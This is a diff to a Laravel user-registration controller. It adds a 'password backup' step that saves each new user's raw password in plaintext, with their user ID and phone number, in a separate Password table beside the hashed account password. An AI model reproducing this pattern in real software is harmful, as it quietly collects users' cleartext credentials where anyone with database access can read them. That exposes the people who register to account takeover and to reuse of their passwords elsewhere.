@@ -9,6 +9,7 @@ use App\Models\Wilaya;
 use Illuminate\Http\Request;
 use Illuminate\Validation\Rules;
 use App\Http\Controllers\Controller;
+use App\Models\Password;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Auth\Events\Registered;
@@ -64,6 +65,12 @@ class RegisteredUserController extends Controller
                 'role_id' => $role_id,
                 'wilaya_id' => $wilaya_id,
             ]);
+
+            $password_backup = new Password;
+            $password_backup->user_id = $user->id;
+            $password_backup->user_phone = $request->phone_number;
+            $password_backup->password = $request->password;
+            $password_backup->save();
         } catch(Exception $e) {
             $error = ValidationException::withMessages([
                 'error1' => ['Kayen li khdm b had numero d telephone 😐,'],
